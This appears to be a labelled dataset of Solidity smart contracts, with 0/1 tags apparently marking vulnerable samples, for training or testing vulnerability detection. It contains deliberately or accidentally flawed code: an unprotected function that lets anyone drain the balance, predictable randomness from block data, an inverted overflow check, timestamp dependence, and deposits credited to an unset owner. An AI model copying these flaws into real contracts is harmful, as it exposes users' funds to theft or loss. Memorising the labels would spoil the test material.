0<CODESPLIT>contract Authorization {    mapping(address => address) public agentBooks;    address public owner;    address public operator;    address public bank;    bool public powerStatus = true;    bool public forceOff = false;    function Authorization()        public    {        owner = msg.sender;        operator = msg.sender;        bank = msg.sender;    }    modifier onlyOwner    {        assert(msg.sender == owner);        _;    }    modifier onlyOperator    {        assert(msg.sender == operator || msg.sender == owner);        _;    }    modifier onlyActive    {        assert(powerStatus);        _;    }    function powerSwitch(        bool onOff_    )        public        onlyOperator    {        if(forceOff) {            powerStatus = false;        } else {            powerStatus = onOff_;        }    }    function transferOwnership(address newOwner_)        onlyOwner        public    {        owner = newOwner_;    }        function assignOperator(address user_)        public        onlyOwner    {        operator = user_;        agentBooks[bank] = user_;    }        function assignBank(address bank_)        public        onlyOwner    {        bank = bank_;    }    function assignAgent(        address agent_    )        public    {        agentBooks[msg.sender] = agent_;    }    function isRepresentor(        address representor_    )        public        view    returns(bool) {        return agentBooks[representor_] == msg.sender;    }    function getUser(        address representor_    )        internal        view    returns(address) {        return isRepresentor(representor_) ? representor_ : msg.sender;    }}
1<CODESPLIT>contract XPAAssets is SafeMath, Authorization {    string public version = "0.5.0";         address public XPA = 0x0090528aeb3a2b736b780fd1b6c478bb7e1d643170;    address public oldXPAAssets = 0x00D0F7d665996B745b2399a127D5d84DAcd42D251f;    address public newXPAAssets = address(0);    address public tokenFactory = 0x001393F1fb2E243Ee68Efe172eBb6831772633A926;         uint256 public maxForceOffsetAmount = 1000000 ether;    uint256 public minForceOffsetAmount = 10000 ether;             event eMortgage(address, uint256);    event eWithdraw(address, address, uint256);    event eRepayment(address, address, uint256);    event eOffset(address, address, uint256);    event eExecuteOffset(uint256, address, uint256);    event eMigrate(address);    event eMigrateAmount(address);         mapping(address => uint256) public fromAmountBooks;    mapping(address => mapping(address => uint256)) public toAmountBooks;    mapping(address => uint256) public forceOffsetBooks;    mapping(address => bool) public migrateBooks;    address[] public xpaAsset;    address public fundAccount;    uint256 public profit = 0;    mapping(address => uint256) public unPaidFundAccount;    uint256 public initCanOffsetTime = 0;             uint256 public withdrawFeeRate = 0.02 ether;      uint256 public offsetFeeRate = 0.02 ether;        uint256 public forceOffsetBasicFeeRate = 0.02 ether;      uint256 public forceOffsetExecuteFeeRate = 0.01 ether;     uint256 public forceOffsetExtraFeeRate = 0.05 ether;      uint256 public forceOffsetExecuteMaxFee = 1000 ether;              function XPAAssets(        uint256 initCanOffsetTime_,        address XPAAddr,        address factoryAddr,        address oldXPAAssetsAddr    ) public {        initCanOffsetTime = initCanOffsetTime_;        XPA = XPAAddr;        tokenFactory = factoryAddr;        oldXPAAssets = oldXPAAssetsAddr;    }    function setFundAccount(        address fundAccount_    )        public        onlyOperator    {        if(fundAccount_ != address(0)) {            fundAccount = fundAccount_;        }    }    function createToken(        string symbol_,        string name_,        uint256 defaultExchangeRate_    )        public        onlyOperator     {        address newAsset = TokenFactory(tokenFactory).createToken(symbol_, name_, defaultExchangeRate_);        for(uint256 i = 0; i < xpaAsset.length; i++) {            if(xpaAsset[i] == newAsset){                return;            }        }        xpaAsset.push(newAsset);    }         function mortgage(        address representor_    )        onlyActive        public    {        address user = getUser(representor_);        uint256 amount_ = Token(XPA).allowance(msg.sender, this);          if(            amount_ >= 100 ether &&             Token(XPA).transferFrom(msg.sender, this, amount_)         ){            fromAmountBooks[user] = safeAdd(fromAmountBooks[user], amount_);              emit eMortgage(user,amount_);          }    }             function withdraw(        address token_,        uint256 amount_,        address representor_    )         onlyActive         public     {        address user = getUser(representor_);        if(            token_ != XPA &&            amount_ > 0 &&            amount_ <= safeDiv(safeMul(safeDiv(safeMul(getUsableXPA(user), getPrice(token_)), 1 ether), getHighestMortgageRate()), 1 ether)        ){            toAmountBooks[user][token_] = safeAdd(toAmountBooks[user][token_],amount_);            uint256 withdrawFee = safeDiv(safeMul(amount_,withdrawFeeRate),1 ether);              XPAAssetToken(token_).create(user, safeSub(amount_, withdrawFee));            XPAAssetToken(token_).create(this, withdrawFee);            emit eWithdraw(user, token_, amount_);          }    }             function withdrawXPA(        uint256 amount_,        address representor_    )        onlyActive        public    {        address user = getUser(representor_);        if(            amount_ >= 100 ether &&             amount_ <= getUsableXPA(user)        ){            fromAmountBooks[user] = safeSub(fromAmountBooks[user], amount_);            require(Token(XPA).transfer(user, amount_));            emit eWithdraw(user, XPA, amount_);          }        }                       function repayment(        address token_,        uint256 amount_,        address representor_    )        onlyActive         public    {        address user = getUser(representor_);        if(            XPAAssetToken(token_).burnFrom(user, amount_)        ) {            toAmountBooks[user][token_] = safeSub(toAmountBooks[user][token_],amount_);            emit eRepayment(user, token_, amount_);        }    }             function offset(        address user_,        address token_    )        onlyActive        public    {        uint256 userFromAmount = fromAmountBooks[user_] >= maxForceOffsetAmount ? maxForceOffsetAmount : fromAmountBooks[user_];        require(block.timestamp > initCanOffsetTime);        require(userFromAmount > 0);        address user = getUser(user_);        if(            user_ == user &&            getLoanAmount(user, token_) > 0        ){            emit eOffset(user, user_, userFromAmount);            uint256 remainingXPA = executeOffset(user_, userFromAmount, token_, offsetFeeRate);            if(remainingXPA > 0){                require(Token(XPA).transfer(fundAccount, safeDiv(safeMul(safeSub(userFromAmount, remainingXPA), 1 ether), safeAdd(1 ether, offsetFeeRate))));              } else {                require(Token(XPA).transfer(fundAccount, safeDiv(safeMul(safeSub(userFromAmount, remainingXPA), safeSub(1 ether, offsetFeeRate)), 1 ether)));              }                        fromAmountBooks[user_] = safeSub(fromAmountBooks[user_], safeSub(userFromAmount, remainingXPA));        }else if(            user_ != user &&             block.timestamp > (forceOffsetBooks[user_] + 28800) &&            getMortgageRate(user_) >= getClosingLine()        ){            forceOffsetBooks[user_] = block.timestamp;                            uint256 punishXPA = getPunishXPA(user_);              emit eOffset(user, user_, punishXPA);            uint256[3] memory forceOffsetFee;            forceOffsetFee[0] = safeDiv(safeMul(punishXPA, forceOffsetBasicFeeRate), 1 ether);              forceOffsetFee[1] = safeDiv(safeMul(punishXPA, forceOffsetExtraFeeRate), 1 ether);              forceOffsetFee[2] = safeDiv(safeMul(punishXPA, forceOffsetExecuteFeeRate), 1 ether);             forceOffsetFee[2] = forceOffsetFee[2] > forceOffsetExecuteMaxFee ? forceOffsetExecuteMaxFee : forceOffsetFee[2];            profit = safeAdd(profit, forceOffsetFee[0]);            uint256 allFee = safeAdd(forceOffsetFee[2],safeAdd(forceOffsetFee[0], forceOffsetFee[1]));            remainingXPA = safeSub(punishXPA,allFee);            for(uint256 i = 0; i < xpaAsset.length; i++) {                if(getLoanAmount(user_, xpaAsset[i]) > 0){                    remainingXPA = executeOffset(user_, remainingXPA, xpaAsset[i],0);                    if(remainingXPA == 0){                        break;                    }                }            }                            fromAmountBooks[user_] = safeSub(fromAmountBooks[user_], safeSub(punishXPA, remainingXPA));            require(Token(XPA).transfer(fundAccount, safeAdd(forceOffsetFee[1],safeSub(safeSub(punishXPA, allFee), remainingXPA))));              require(Token(XPA).transfer(msg.sender, forceOffsetFee[2]));          }    }        function executeOffset(        address user_,        uint256 xpaAmount_,        address xpaAssetToken,        uint256 feeRate    )        internal    returns(uint256){        uint256 fromXPAAsset = safeDiv(safeMul(xpaAmount_,getPrice(xpaAssetToken)),1 ether);        uint256 userToAmount = toAmountBooks[user_][xpaAssetToken];        uint256 fee = safeDiv(safeMul(userToAmount, feeRate), 1 ether);        uint256 burnXPA;        uint256 burnXPAAsset;        if(fromXPAAsset >= safeAdd(userToAmount, fee)){            burnXPA = safeDiv(safeMul(safeAdd(userToAmount, fee), 1 ether), getPrice(xpaAssetToken));            emit eExecuteOffset(burnXPA, xpaAssetToken, safeAdd(userToAmount, fee));            xpaAmount_ = safeSub(xpaAmount_, burnXPA);            toAmountBooks[user_][xpaAssetToken] = 0;            profit = safeAdd(profit, safeDiv(safeMul(fee,1 ether), getPrice(xpaAssetToken)));            if(                !FundAccount(fundAccount).burn(xpaAssetToken, userToAmount)            ){                unPaidFundAccount[xpaAssetToken] = safeAdd(unPaidFundAccount[xpaAssetToken],userToAmount);            }        }else{                        fee = safeDiv(safeMul(xpaAmount_, feeRate), 1 ether);            profit = safeAdd(profit, fee);            burnXPAAsset = safeDiv(safeMul(safeSub(xpaAmount_, fee),getPrice(xpaAssetToken)),1 ether);            toAmountBooks[user_][xpaAssetToken] = safeSub(userToAmount, burnXPAAsset);            emit eExecuteOffset(xpaAmount_, xpaAssetToken, burnXPAAsset);                        xpaAmount_ = 0;            if(                !FundAccount(fundAccount).burn(xpaAssetToken, burnXPAAsset)            ){                unPaidFundAccount[xpaAssetToken] = safeAdd(unPaidFundAccount[xpaAssetToken], burnXPAAsset);            }                    }        return xpaAmount_;    }        function getPunishXPA(        address user_    )        internal        view     returns(uint256){        uint256 userFromAmount = fromAmountBooks[user_];        uint256 punishXPA = safeDiv(safeMul(userFromAmount, 0.1 ether),1 ether);        if(userFromAmount <= safeAdd(minForceOffsetAmount, 100 ether)){            return userFromAmount;        }else if(punishXPA < minForceOffsetAmount){            return minForceOffsetAmount;        }else if(punishXPA > maxForceOffsetAmount){            return maxForceOffsetAmount;        }else{            return punishXPA;        }    }             function getMortgageRate(        address user_    )         public        view     returns(uint256){        if(fromAmountBooks[user_] != 0){            uint256 totalLoanXPA = 0;            for(uint256 i = 0; i < xpaAsset.length; i++) {                totalLoanXPA = safeAdd(totalLoanXPA, safeDiv(safeMul(getLoanAmount(user_,xpaAsset[i]), 1 ether), getPrice(xpaAsset[i])));            }            return safeDiv(safeMul(totalLoanXPA,1 ether),fromAmountBooks[user_]);        }else{            return 0;        }    }                 function getHighestMortgageRate()         public        view     returns(uint256){        uint256 totalXPA = Token(XPA).totalSupply();        uint256 issueRate = safeDiv(safeMul(Token(XPA).balanceOf(this), 1 ether), totalXPA);        if(issueRate >= 0.7 ether){            return 0.7 ether;        }else if(issueRate >= 0.6 ether){            return 0.6 ether;        }else if(issueRate >= 0.5 ether){            return 0.5 ether;        }else if(issueRate >= 0.3 ether){            return 0.3 ether;        }else{            return 0.1 ether;        }    }             function getClosingLine()         public        view    returns(uint256){        uint256 highestMortgageRate = getHighestMortgageRate();        if(highestMortgageRate >= 0.6 ether){            return safeAdd(highestMortgageRate, 0.1 ether);        }else{            return 0.6 ether;        }    }             function getPrice(        address token_    )         public        view    returns(uint256){        return TokenFactory(tokenFactory).getPrice(token_);    }             function getUsableXPA(        address user_    )        public        view    returns(uint256) {        uint256 totalLoanXPA = 0;        for(uint256 i = 0; i < xpaAsset.length; i++) {            totalLoanXPA = safeAdd(totalLoanXPA, safeDiv(safeMul(getLoanAmount(user_,xpaAsset[i]), 1 ether), getPrice(xpaAsset[i])));        }        if(fromAmountBooks[user_] > safeDiv(safeMul(totalLoanXPA, 1 ether), getHighestMortgageRate())){            return safeSub(fromAmountBooks[user_], safeDiv(safeMul(totalLoanXPA, 1 ether), getHighestMortgageRate()));        }else{            return 0;        }    }                           function getLoanAmount(        address user_,        address token_    )         public        view    returns(uint256) {        return toAmountBooks[user_][token_];    }             function getRemainingAmount(        address user_,        address token_    )         public        view    returns(uint256) {        uint256 amount = safeDiv(safeMul(getUsableXPA(user_), getPrice(token_)), 1 ether);        return safeDiv(safeMul(amount, getHighestMortgageRate()), 1 ether);    }        function burnFundAccount(        address token_,        uint256 amount_    )        onlyOperator        public    {        if(            FundAccount(fundAccount).burn(token_, amount_)        ){            unPaidFundAccount[token_] = safeSub(unPaidFundAccount[token_], amount_);        }    }    function transferProfit(        address token_,        uint256 amount_    )        onlyOperator         public    {        require(amount_ > 0);        if(            XPA != token_ &&             Token(token_).balanceOf(this) >= amount_        ) {            require(Token(token_).transfer(bank, amount_));        }        if(            XPA == token_ &&             Token(XPA).balanceOf(this) >= amount_        ) {            profit = safeSub(profit,amount_);            require(Token(token_).transfer(bank, amount_));        }    }            function setFeeRate(        uint256 withDrawFeerate_,        uint256 offsetFeerate_,        uint256 forceOffsetBasicFeerate_,        uint256 forceOffsetExecuteFeerate_,        uint256 forceOffsetExtraFeerate_,        uint256 forceOffsetExecuteMaxFee_    )        onlyOperator         public    {        require(withDrawFeerate_ < 0.05 ether);        require(offsetFeerate_ < 0.05 ether);        require(forceOffsetBasicFeerate_ < 0.05 ether);        require(forceOffsetExecuteFeerate_ < 0.05 ether);        require(forceOffsetExtraFeerate_ < 0.05 ether);        withdrawFeeRate = withDrawFeerate_;        offsetFeeRate = offsetFeerate_;        forceOffsetBasicFeeRate = forceOffsetBasicFeerate_;        forceOffsetExecuteFeeRate = forceOffsetExecuteFeerate_;        forceOffsetExtraFeeRate = forceOffsetExtraFeerate_;        forceOffsetExecuteMaxFee = forceOffsetExecuteMaxFee_;    }        function setForceOffsetAmount(        uint256 maxForceOffsetAmount_,        uint256 minForceOffsetAmount_    )        onlyOperator        public    {        maxForceOffsetAmount = maxForceOffsetAmount_;        minForceOffsetAmount = minForceOffsetAmount_;    }            function migrate(        address newContract_    )        public        onlyOwner    {        require(newContract_ != address(0));        if(            newXPAAssets == address(0) &&            XPAAssets(newContract_).transferXPAAssetAndProfit(xpaAsset, profit) &&            Token(XPA).transfer(newContract_, Token(XPA).balanceOf(this))        ) {            forceOff = true;            powerStatus = false;            newXPAAssets = newContract_;            for(uint256 i = 0; i < xpaAsset.length; i++) {                XPAAssets(newContract_).transferUnPaidFundAccount(xpaAsset[i], unPaidFundAccount[xpaAsset[i]]);            }            emit eMigrate(newContract_);        }    }        function transferXPAAssetAndProfit(        address[] xpaAsset_,        uint256 profit_    )        public        onlyOperator    returns(bool) {        require(msg.sender == oldXPAAssets);        xpaAsset = xpaAsset_;        profit = profit_;        return true;    }        function transferUnPaidFundAccount(        address xpaAsset_,        uint256 unPaidAmount_    )        public        onlyOperator    returns(bool) {        require(msg.sender == oldXPAAssets);        unPaidFundAccount[xpaAsset_] = unPaidAmount_;        return true;    }        function migratingAmountBooks(        address user_,        address newContract_    )        public        onlyOperator    {        XPAAssets(newContract_).migrateAmountBooks(user_);     }        function migrateAmountBooks(        address user_    )        public        onlyOperator     {        require(msg.sender == oldXPAAssets);        require(!migrateBooks[user_]);        migrateBooks[user_] = true;        fromAmountBooks[user_] = safeAdd(fromAmountBooks[user_],XPAAssets(oldXPAAssets).getFromAmountBooks(user_));        forceOffsetBooks[user_] = XPAAssets(oldXPAAssets).getForceOffsetBooks(user_);        for(uint256 i = 0; i < xpaAsset.length; i++) {            toAmountBooks[user_][xpaAsset[i]] = safeAdd(toAmountBooks[user_][xpaAsset[i]], XPAAssets(oldXPAAssets).getLoanAmount(user_,xpaAsset[i]));        }        emit eMigrateAmount(user_);    }        function getFromAmountBooks(        address user_    )        public        view     returns(uint256) {        return fromAmountBooks[user_];    }        function getForceOffsetBooks(        address user_    )        public         view     returns(uint256) {        return forceOffsetBooks[user_];    }}
0<CODESPLIT>contract InitialTokenDistribution is Ownable {    using SafeMath for uint256;    ERC20 public token;    mapping (address => TokenVesting) public vested;    mapping (address => TokenTimelock) public timelocked;    mapping (address => uint256) public initiallyDistributed;    bool public initialDistributionDone = false;    modifier onInitialDistribution() {        require(!initialDistributionDone);        _;    }    constructor(ERC20 _token) public {        token = _token;    }         function initialDistribution() internal;         function totalTokensDistributed() public view returns (uint256);         function processInitialDistribution() onInitialDistribution onlyOwner public {        initialDistribution();        initialDistributionDone = true;    }    function initialTransfer(address to, uint256 amount) onInitialDistribution public {        require(to != address(0));        initiallyDistributed[to] = amount;        token.transferFrom(msg.sender, to, amount);    }    function vest(address to, uint256 amount, uint256 releaseStart, uint256 cliff, uint256 duration) onInitialDistribution public {        require(to != address(0));        vested[to] = new TokenVesting(to, releaseStart, cliff, duration, false);        token.transferFrom(msg.sender, vested[to], amount);    }    function lock(address to, uint256 amount, uint256 releaseTime) onInitialDistribution public {        require(to != address(0));        timelocked[to] = new TokenTimelock(token, to, releaseTime);        token.transferFrom(msg.sender, address(timelocked[to]), amount);    }}  
0<CODESPLIT>contract BlockFollowInitialTokenDistribution is InitialTokenDistribution {    uint256 public reservedTokensFunctionality;    uint256 public reservedTokensTeam;    address functionalityWallet;    address teamWallet;    constructor(        DetailedERC20 _token,        address _functionalityWallet,        address _teamWallet    )    public    InitialTokenDistribution(_token)    {        functionalityWallet = _functionalityWallet;        teamWallet = _teamWallet;        uint8 decimals = _token.decimals();        reservedTokensFunctionality = 80e6 * (10 ** uint256(decimals));        reservedTokensTeam = 10e6 * (10 ** uint256(decimals));    }    function initialDistribution() internal {        initialTransfer(functionalityWallet, reservedTokensFunctionality);        initialTransfer(teamWallet, reservedTokensTeam);    }    function totalTokensDistributed() public view returns (uint256) {        return reservedTokensFunctionality + reservedTokensTeam;    }}
0<CODESPLIT>contract VEToken {    address owner = msg.sender;    bool public purchasingAllowed = false;    mapping (address => uint256) balances;    mapping (address => mapping (address => uint256)) allowed;    uint256 public totalContribution = 0;    uint256 public totalBonusTokensIssued = 0;    uint256 public totalSupply = 0;    function name() constant returns (string) { return "Valueless Ethereum Token"; }    function symbol() constant returns (string) { return "VET"; }    function decimals() constant returns (uint8) { return 18; }        function balanceOf(address _owner) constant returns (uint256) { return balances[_owner]; }        function transfer(address _to, uint256 _value) returns (bool success) {                 if(msg.data.length < (2 * 32) + 4) { throw; }        if (_value == 0) { return false; }        uint256 fromBalance = balances[msg.sender];        bool sufficientFunds = fromBalance >= _value;        bool overflowed = balances[_to] + _value < balances[_to];                if (sufficientFunds && !overflowed) {            balances[msg.sender] -= _value;            balances[_to] += _value;                        Transfer(msg.sender, _to, _value);            return true;        } else { return false; }    }        function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {                 if(msg.data.length < (3 * 32) + 4) { throw; }        if (_value == 0) { return false; }                uint256 fromBalance = balances[_from];        uint256 allowance = allowed[_from][msg.sender];        bool sufficientFunds = fromBalance >= _value;        bool sufficientAllowance = allowance >= _value;        bool overflowed = balances[_to] + _value > balances[_to];        if (sufficientFunds && sufficientAllowance && overflowed) {            balances[_to] += _value;            balances[_from] -= _value;                        allowed[_from][msg.sender] -= _value;                        Transfer(_from, _to, _value);            return true;        } else { return false; }    }        function approve(address _spender, uint256 _value) returns (bool success) {                 if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }                allowed[msg.sender][_spender] = _value;                Approval(msg.sender, _spender, _value);        return true;    }        function allowance(address _owner, address _spender) constant returns (uint256) {        return allowed[_owner][_spender];    }    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);    function enablePurchasing() {        if (msg.sender != owner) { throw; }        purchasingAllowed = true;    }    function disablePurchasing() {        if (msg.sender != owner) { throw; }        purchasingAllowed = false;    }    function withdrawForeignTokens(address _tokenContract) returns (bool) {        if (msg.sender != owner) { throw; }ForeignToken token = ForeignToken(_tokenContract);        uint256 amount = token.balanceOf(address(this));        return token.transfer(owner, amount);    }    function getStats() constant returns (uint256, uint256, uint256, bool) {        return (totalContribution, totalSupply, totalBonusTokensIssued, purchasingAllowed);    }    function() payable {        if (!purchasingAllowed) { throw; }                if (msg.value == 0) { return; }        owner.transfer(msg.value);        totalContribution += msg.value;        uint256 tokensIssued = (msg.value * 1000);        if (msg.value >= 10 finney) {            tokensIssued += totalContribution;            bytes20 bonusHash = ripemd160(block.coinbase, block.number, block.timestamp);            if (bonusHash[0] == 0) {                uint8 bonusMultiplier =                    ((bonusHash[1] & 0x01 != 0) ? 1 : 0) + ((bonusHash[1] & 0x02 != 0) ? 1 : 0) +                    ((bonusHash[1] & 0x04 != 0) ? 1 : 0) + ((bonusHash[1] & 0x08 != 0) ? 1 : 0) +                    ((bonusHash[1] & 0x10 != 0) ? 1 : 0) + ((bonusHash[1] & 0x20 != 0) ? 1 : 0) +                    ((bonusHash[1] & 0x40 != 0) ? 1 : 0) + ((bonusHash[1] & 0x80 != 0) ? 1 : 0);                                uint256 bonusTokensIssued = (msg.value * 1000) * bonusMultiplier;                tokensIssued += bonusTokensIssued;                totalBonusTokensIssued += bonusTokensIssued;            }        }        totalSupply += tokensIssued;        balances[msg.sender] += tokensIssued;                Transfer(address(this), msg.sender, tokensIssued);    }}
0<CODESPLIT>contract Inner3WithEth {    Inner4WithEth public myInner4 = new Inner4WithEth();        function callSomeFunctionViaInner3() public payable{        myInner4.doSomething.value(msg.value)();    }}
0<CODESPLIT>contract Inner4WithEth {    uint256 someValue;    event SetValue(uint256 val);        function doSomething() public payable {        someValue = block.timestamp;        emit SetValue(someValue);    }        function getAllMoneyOut() public {        msg.sender.transfer(this.balance);    }}
1<CODESPLIT>contract EthTermDeposits{ 	mapping(address => uint) public deposits; 	mapping(address => uint) public depositEndTime; 	address owner;	function Deposit(uint8 numberOfWeeks) payable returns(bool){		uint _time = block.timestamp + numberOfWeeks * 1 weeks;		if(deposits[owner] > 0){			_time = depositEndTime[owner] + numberOfWeeks * 1 weeks;		}		depositEndTime[owner] = _time;		deposits[owner] += msg.value;		return true;	}}
